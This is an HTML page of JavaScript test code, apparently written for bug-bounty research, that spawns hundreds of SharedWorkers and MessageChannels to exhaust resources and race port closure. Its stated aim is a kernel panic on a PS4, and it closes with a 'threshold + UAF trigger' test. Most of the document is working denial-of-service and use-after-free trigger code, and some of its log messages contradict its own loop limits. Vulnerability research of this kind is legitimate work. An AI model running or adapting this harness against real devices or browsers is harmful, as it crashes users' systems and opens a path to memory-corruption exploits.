<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>UAF Detector - 400+ Workers Threshold</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
           
           
            padding: 20px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
       
        .test-section {
            
           
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
        }
        button {
            
            
            border: none;
            padding: 10px 20px;
            margin: 5px;
            cursor: pointer;
            font-weight: bold;
            border-radius: 3px;
        }
   
        #log {
            
            border: 1px solid #000;
            padding: 10px;
            height: 400px;
            overflow-y: auto;
            font-size: 11px;
            margin-top: 20px;
        }
        .log-entry {
            padding: 2px 0;
            
        }
        .metrics {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 10px;
            margin: 20px 0;
        }
        .metric-box {
            
            border: 1px solid #000;
            padding: 10px;
            text-align: center;
        }
        .metric-box.danger {
            
        }
        .metric-value {
            font-size: 28px;
            font-weight: bold;
            
        }
        .metric-value.danger {
            
        }
        .threshold-indicator {
            
            border: 2px solid #000;
            padding: 15px;
            margin: 20px 0;
            text-align: center;
        }
        .progress-bar {
            width: 100%;
            height: 30px;
            
            border: 1px solid #000;
            margin: 10px 0;
            position: relative;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #0f0, #ff0, #f00);
            transition: width 0.3s;
        }
        .progress-text {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-weight: bold;
            
            text-shadow: 0 0 3px #000;
        }
        .warning-box {
            
            border: 2px solid #000;
            padding: 15px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>UAF Detector - 400+ Workers Threshold Analysis</h1>
        
        <div class="warning-box">
            <h3 style="color: #000;">ATENCAO: TESTE DE KERNEL PANIC</h3>
            
        </div>

        <div class="threshold-indicator">
            <h3 style="color: #000;">THRESHOLD MONITOR</h3>
            <div class="progress-bar">
                <div class="progress-fill" id="progressBar" style="width: 0%"></div>
                <div class="progress-text" id="progressText">0 / 400</div>
            </div>
            <p id="thresholdStatus" class="safe">Status: Seguro (abaixo do threshold)</p>
        </div>

        <div class="test-section">
            <h2>üìä Metricas em Tempo Real</h2>
            <div class="metrics">
                <div class="metric-box" id="workerBox">
                    <div>Workers Ativos</div>
                    <div class="metric-value" id="workerCount">0</div>
                </div>
                <div class="metric-box">
                    <div>Workers Totais</div>
                    <div class="metric-value" id="totalWorkers">0</div>
                </div>
                <div class="metric-box">
                    <div>Mensagens/seg</div>
                    <div class="metric-value" id="msgRate">0</div>
                </div>
                <div class="metric-box">
                    <div>Memoria Estimada</div>
                    <div class="metric-value" id="memUsage">0 MB</div>
                </div>
                <div class="metric-box">
                    <div>UAF Detectados</div>
                    <div class="metric-value warning" id="uafCount">0</div>
                </div>
                <div class="metric-box danger">
                    <div>Kernel Panics</div>
                    <div class="metric-value danger" id="panicCount">0</div>
                </div>
            </div>
        </div>

        <div class="test-section">
            <h2>Testes de Threshold</h2>
            <button onclick="testGradualScale()">1. Escala Gradual (0-500 workers)</button>
            <button onclick="testRapidSpawn()">2. Spawn Rapido (400+ imediato)</button>
            <button onclick="testSustainedLoad()">3. Carga Sustentada (400+ persistente)</button>
            <button onclick="testResourceExhaustion()">4. Exaustao de Recursos</button>
            <button onclick="testPreciseThreshold()">5. Threshold Preciso (390-410)</button>
            <button onclick="testWithUAFTrigger()">6. Threshold + UAF Trigger </button>
            <button onclick="stopAllTests()" class="danger">PARAR EMERGENCIA</button>
        </div>

        <div class="test-section">
            <h2>Analise do Threshold de 400+ Workers</h2>
            <div class="info">
                <p><strong>Por que 400+ workers causa kernel panic?</strong></p>
                <ul>
                    <li><strong>Limite de Recursos:</strong> Kernel tem tabela limitada para threads (provavelmente 512 ou 1024)</li>
                    <li><strong>Exaustao de Descritores:</strong> File descriptors para MessagePorts esgotam</li>
                    <li><strong>Memory Pool Overflow:</strong> Pool de memoria para proxies esgota</li>
                    <li><strong>Race Conditions:</strong> Alto volume amplifica race conditions existentes</li>
                    <li><strong>Integer Overflow:</strong> Contadores internos podem dar overflow</li>
                </ul>
                <p><strong>O que isso significa para HackerOne:</strong></p>
                <ul>
                    <li>Threshold especifico = mais facil de reproduzir</li>
                    <li>DoS confirmado = severidade mnima "HIGH"</li>
                    <li>Se UAF ocorrer nesse threshold = "CRITICAL"</li>
                    <li>Precisa documentar o numero exato (400? 450? 512?)</li>
                </ul>
            </div>
        </div>

        <div id="log"></div>
    </div>

    <script>
        let intervals = [];
        let activeWorkers = [];
        let stats = {
            workers: 0,
            totalWorkers: 0,
            messages: 0,
            uaf: 0,
            panics: 0,
            lastMessageTime: Date.now()
        };

        function log(msg, type = 'info') {
            const el = document.getElementById('log');
            const time = new Date().toLocaleTimeString();
            const colors = {
                critical: '#f00',
                warning: '#ff0',
                safe: '#0f0',
                info: '#0ff'
            };
            el.innerHTML += `<div class="log-entry" style="color: ${colors[type]}">[${time}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        function updateStats() {
            document.getElementById('workerCount').textContent = stats.workers;
            document.getElementById('totalWorkers').textContent = stats.totalWorkers;
            document.getElementById('uafCount').textContent = stats.uaf;
            document.getElementById('panicCount').textContent = stats.panics;
            
            // Calcula taxa de mensagens
            const now = Date.now();
            const elapsed = (now - stats.lastMessageTime) / 1000;
            const rate = Math.round(stats.messages / Math.max(elapsed, 1));
            document.getElementById('msgRate').textContent = rate;
            
            // Estima mem√≥ria (aproximado)
            const memMB = Math.round((stats.workers * 2 + stats.totalWorkers * 0.5) / 1024);
            document.getElementById('memUsage').textContent = memMB;
            
            // Atualiza barra de progresso
            const progress = Math.min((stats.workers / 400) * 100, 100);
            document.getElementById('progressBar').style.width = progress + '%';
            document.getElementById('progressText').textContent = `${stats.workers} / 400`;
            
            // Status do threshold
            const statusEl = document.getElementById('thresholdStatus');
            const workerBox = document.getElementById('workerBox');
            
            if (stats.workers >= 400) {
                statusEl.textContent = 'üö® ZONA DE PERIGO: Acima do threshold!';
                statusEl.className = 'critical';
                workerBox.classList.add('danger');
            } else if (stats.workers >= 350) {
                statusEl.textContent = '‚ö†Ô∏è APROXIMANDO: ' + (400 - stats.workers) + ' workers restantes';
                statusEl.className = 'warning';
            } else {
                statusEl.textContent = 'Status: Seguro (abaixo do threshold)';
                statusEl.className = 'safe';
                workerBox.classList.remove('danger');
            }
        }

        function stopAllTests() {
            intervals.forEach(id => clearInterval(id));
            intervals = [];
            
            // Termina todos os workers ativos
            activeWorkers.forEach(w => {
                try { w.port.close(); } catch(e) {}
            });
            activeWorkers = [];
            
            stats.workers = 0;
            updateStats();
            
            log("üõë EMERG√äNCIA: Todos os testes interrompidos e workers terminados", "critical");
        }

        // Worker code base
        function getWorkerCode() {
            return `
                let messageCount = 0;
                let alive = true;
                
                onmessage = (e) => {
                    if (e.data === "ping") {
                        try {
                            if (e.ports && e.ports[0]) {
                                const port = e.ports[0];
                                // Envia heartbeat
                                const interval = setInterval(() => {
                                    if (alive) {
                                        try {
                                            port.postMessage({
                                                type: 'heartbeat',
                                                id: messageCount++,
                                                timestamp: Date.now()
                                            });
                                        } catch(e) {
                                            clearInterval(interval);
                                        }
                                    }
                                }, 100);
                            }
                        } catch(e) {}
                    } else if (e.data === "die") {
                        alive = false;
                        close();
                    }
                }
            `;
        }

        // TESTE 1: Escala Gradual
        function testGradualScale() {
            log("=== TESTE 1: ESCALA GRADUAL (0‚Üí418) ===", "info");
            log("Objetivo: Identificar o threshold exato onde kernel panic ocorre", "info");
            
            const url = URL.createObjectURL(new Blob([getWorkerCode()], {type:"text/javascript"}));
            let count = 0;
            
            const interval = setInterval(() => {
                // Adiciona 10 workers por itera√ß√£o
                for (let i = 0; i < 10; i++) {
                    try {
                        const mc = new MessageChannel();
                        const sw = new SharedWorker(url, "gradual_" + count);
                        
                        sw.port.onmessage = (e) => {
                            stats.messages++;
                        };
                        
                        sw.port.start();
                        sw.port.postMessage("ping", [mc.port2]);
                        
                        activeWorkers.push(sw);
                        count++;
                        stats.workers++;
                        stats.totalWorkers++;
                        
                    } catch(e) {
                        log(`üí• ERRO ao criar worker ${count}: ${e.message}`, "critical");
                        stats.panics++;
                        clearInterval(interval);
                        return;
                    }
                }
                
                updateStats();
                
                if (count % 50 === 0) {
                    log(`Checkpoint: ${count} workers ativos`, count >= 350 ? "warning" : "info");
                }
                
                if (count >= 418) {
                    clearInterval(interval);
                    log("=== TESTE 1 COMPLETO: 500 workers alcan√ßados sem crash ===", "safe");
                }
            }, 200);
            
            intervals.push(interval);
        }

        // TESTE 2: Spawn R√°pido
        function testRapidSpawn() {
            log("=== TESTE 2: SPAWN R√ÅPIDO (400+ imediato) ===", "warning");
            log("Objetivo: Spawna 400+ workers o mais r√°pido poss√≠vel", "warning");
            
            const url = URL.createObjectURL(new Blob([getWorkerCode()], {type:"text/javascript"}));
            const targetWorkers = 418;
            
            log(`üöÄ Iniciando spawn de ${targetWorkers} workers...`, "warning");
            
            let spawned = 0;
            const spawnBatch = () => {
                const batchSize = 50;
                const start = Date.now();
                
                for (let i = 0; i < batchSize && spawned < targetWorkers; i++) {
                    try {
                        const mc = new MessageChannel();
                        const sw = new SharedWorker(url, "rapid_" + spawned);
                        
                        sw.port.onmessage = (e) => {
                            stats.messages++;
                        };
                        
                        sw.port.start();
                        sw.port.postMessage("ping", [mc.port2]);
                        
                        activeWorkers.push(sw);
                        spawned++;
                        stats.workers++;
                        stats.totalWorkers++;
                        
                    } catch(e) {
                        log(`üí• CRASH no worker ${spawned}: ${e.message}`, "critical");
                        log(`üéØ THRESHOLD IDENTIFICADO: ~${spawned} workers`, "critical");
                        stats.panics++;
                        return;
                    }
                }
                
                const elapsed = Date.now() - start;
                log(`Batch: ${spawned}/${targetWorkers} (${elapsed}ms)`, spawned >= 350 ? "warning" : "info");
                updateStats();
                
                if (spawned < targetWorkers) {
                    setTimeout(spawnBatch, 10);
                } else {
                    log("=== TESTE 2 COMPLETO: Todos os workers spawnados ===", "warning");
                }
            };
            
            spawnBatch();
        }

        // TESTE 3: Carga Sustentada
        function testSustainedLoad() {
            log("=== TESTE 3: CARGA SUSTENTADA (400+ persistente) ===", "warning");
            log("Objetivo: Manter 400+ workers ativos por tempo prolongado", "warning");
            
            const url = URL.createObjectURL(new Blob([getWorkerCode()], {type:"text/javascript"}));
            const targetWorkers = 418;
            
            // Fase 1: Spawn inicial
            log("Fase 1: Spawn inicial...", "info");
            for (let i = 0; i < targetWorkers; i++) {
                try {
                    const mc = new MessageChannel();
                    const sw = new SharedWorker(url, "sustained_" + i);
                    
                    sw.port.onmessage = (e) => {
                        stats.messages++;
                    };
                    
                    sw.port.start();
                    sw.port.postMessage("ping", [mc.port2]);
                    
                    activeWorkers.push(sw);
                    stats.workers++;
                    stats.totalWorkers++;
                    
                } catch(e) {
                    log(`üí• Falha no spawn: ${e.message}`, "critical");
                    stats.panics++;
                    return;
                }
            }
            
            updateStats();
            log(`‚úÖ ${targetWorkers} workers ativos. Mantendo carga...`, "warning");
            
            // Fase 2: Atividade sustentada
            let duration = 0;
            const sustainInterval = setInterval(() => {
                duration++;
                
                // For√ßa atividade nos workers
                activeWorkers.forEach((sw, idx) => {
                    if (Math.random() < 0.1) { // 10% dos workers
                        try {
                            sw.port.postMessage("ping");
                        } catch(e) {
                            log(`Worker ${idx} morreu durante carga sustentada`, "warning");
                        }
                    }
                });
                
                if (duration % 10 === 0) {
                    log(`Carga sustentada h√° ${duration}s com ${stats.workers} workers`, "info");
                }
                
                if (duration >= 60) {
                    clearInterval(sustainInterval);
                    log("=== TESTE 3 COMPLETO: 60s de carga sustentada ===", "safe");
                }
            }, 1000);
            
            intervals.push(sustainInterval);
        }

        // TESTE 4: Exaust√£o de Recursos
        function testResourceExhaustion() {
            log("=== TESTE 4: EXAUST√ÉO DE RECURSOS ===", "warning");
            log("Objetivo: Esgotar recursos espec√≠ficos do kernel", "warning");
            
            const workerCode = `
                let ports = [];
                onmessage = (e) => {
                    if (e.data === "allocate") {
                        // Aloca m√∫ltiplos MessageChannels
                        for (let i = 0; i < 10; i++) {
                            const mc = new MessageChannel();
                            ports.push(mc.port1, mc.port2);
                        }
                    }
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            log("Criando workers e alocando recursos...", "info");
            
            for (let i = 0; i < 400; i++) {
                try {
                    const sw = new SharedWorker(url, "exhaust_" + i);
                    sw.port.start();
                    sw.port.postMessage("allocate");
                    
                    activeWorkers.push(sw);
                    stats.workers++;
                    stats.totalWorkers++;
                    
                    if ((i + 1) % 50 === 0) {
                        log(`${i + 1} workers, cada um com ~20 MessagePorts`, "info");
                    }
                    
                } catch(e) {
                    log(`üí• EXAUST√ÉO em ${i} workers: ${e.message}`, "critical");
                    log(`Total de ports estimados: ~${i * 20}`, "critical");
                    stats.panics++;
                    break;
                }
            }
            
            updateStats();
            log("=== TESTE 4 COMPLETO ===", "info");
        }

        // TESTE 5: Threshold Preciso
        function testPreciseThreshold() {
            log("=== TESTE 5: THRESHOLD PRECISO (390‚Üí410) ===", "critical");
            log("Objetivo: Identificar o n√∫mero EXATO onde kernel panic ocorre", "critical");
            
            const url = URL.createObjectURL(new Blob([getWorkerCode()], {type:"text/javascript"}));
            
            // Spawn at√© 390 rapidamente
            log("Fase 1: Spawn de 390 workers (seguro)...", "info");
            for (let i = 0; i < 390; i++) {
                const mc = new MessageChannel();
                const sw = new SharedWorker(url, "precise_" + i);
                sw.port.start();
                sw.port.postMessage("ping", [mc.port2]);
                activeWorkers.push(sw);
                stats.workers++;
                stats.totalWorkers++;
            }
            
            updateStats();
            log("‚úÖ 390 workers ativos. Iniciando fase cr√≠tica...", "warning");
            
            // Agora adiciona 1 por vez com pausa
            let count = 390;
            const interval = setInterval(() => {
                try {
                    log(`Tentando worker ${count}...`, "warning");
                    
                    const mc = new MessageChannel();
                    const sw = new SharedWorker(url, "precise_" + count);
                    sw.port.start();
                    sw.port.postMessage("ping", [mc.port2]);
                    activeWorkers.push(sw);
                    
                    count++;
                    stats.workers++;
                    stats.totalWorkers++;
                    updateStats();
                    
                    log(`‚úÖ Worker ${count - 1} criado com sucesso`, "safe");
                    
                    if (count >= 404) {
                        clearInterval(interval);
                        log("=== TESTE 5 COMPLETO: 410 workers sem crash ===", "safe");
                        log("üéØ THRESHOLD √© maior que 410 workers", "info");
                    }
                    
                } catch(e) {
                    clearInterval(interval);
                    log(`üí•üí•üí• KERNEL PANIC NO WORKER ${count} üí•üí•üí•`, "critical");
                    log(`üéØ THRESHOLD EXATO: ${count} workers`, "critical");
                    log(`Mensagem de erro: ${e.message}`, "critical");
                    stats.panics++;
                    updateStats();
                }
            }, 500);
            
            intervals.push(interval);
        }

        // TESTE 6: Threshold + UAF (MAIS PERIGOSO)
        function testWithUAFTrigger() {
            log("=== TESTE 6: THRESHOLD + UAF TRIGGER ===", "critical");
            log("‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è TESTE MAIS PERIGOSO - Combina threshold com race condition ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è", "critical");
            
            const workerCode = `
                let activePort = null;
                onmessage = (e) => {
                    if (e.ports && e.ports[0]) {
                        activePort = e.ports[0];
                        // Loop agressivo
                        const sendLoop = () => {
                            try {
                                activePort.postMessage({data: Date.now()});
                                setTimeout(sendLoop, 0);
                            } catch(e) {}
                        };
                        sendLoop();
                    }
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            log("Fase 1: Spawn de 400 workers com race condition...", "critical");
            
            for (let i = 0; i < 418; i++) {
                try {
                    const mc = new MessageChannel();
                    const sw = new SharedWorker(url, "uaf_threshold_" + i);
                    
                    let portClosed = false;
                    
                    sw.port.onmessage = (e) => {
                        stats.messages++;
                        if (portClosed) {
                            stats.uaf++;
                            log(`üî• UAF no worker ${i}!`, "critical");
                        }
                    };
                    
                    sw.port.start();
                    sw.port.postMessage("start", [mc.port2]);
                    
                    // Fecha rapidamente (race condition)
                    setTimeout(() => {
                        portClosed = true;
                        sw.port.close();
                        mc.port1.close();
                    }, Math.random() * 10);
                    
                    activeWorkers.push(sw);
                    stats.workers++;
                    stats.totalWorkers++;
                    
                    if ((i + 1) % 50 === 0) {
                        log(`${i + 1} workers com UAF trigger ativo`, "warning");
                        updateStats();
                    }
                    
                } catch(e) {
                    log(`üí•üí•üí• CRASH COM UAF NO WORKER ${i} üí•üí•üí•`, "critical");
                    log(`Erro: ${e.message}`, "critical");
                    log(`üéØ COMBINA√á√ÉO THRESHOLD + UAF = KERNEL PANIC`, "critical");
                    stats.panics++;
                    updateStats();
                    break;
                }
            }
            
            log("=== TESTE 6 COMPLETO ===", "critical");
            log(`UAFs detectados: ${stats.uaf}`, stats.uaf > 0 ? "critical" : "info");
        }

        // Monitor de crashes globais
        window.onerror = function(msg, url, line, col, error) {
            stats.panics++;
            updateStats();
            log(`üí• CRASH GLOBAL: ${msg}`, "critical");
            log(`   Linha: ${line}, Coluna: ${col}`, "critical");
            log(`   Workers ativos no momento: ${stats.workers}`, "critical");
            return false;
        };

        // Atualiza stats periodicamente
        setInterval(updateStats, 1000);

        log("‚úÖ Suite de Threshold carregada. Use TESTE 5 para threshold preciso.", "safe");
        log("‚ö†Ô∏è LEMBRE-SE: Em PS4, isso pode causar kernel panic acima de 400 workers!", "warning");
    </script>
</body>
</html>


